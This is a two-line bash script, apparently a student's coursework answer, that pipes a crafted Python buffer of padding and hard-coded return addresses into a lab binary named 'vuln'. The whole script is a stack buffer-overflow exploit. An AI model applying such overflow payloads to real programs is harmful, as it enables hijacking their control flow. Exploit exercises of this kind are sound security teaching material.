#!/usr/bin/env bash
python -c 'print "b"*323 + "\xe4\x88\xff\x43" + "b"*324  + "\x30\xb3\xe5\xe0" + "b"*6' | /task1/s1976502/vuln
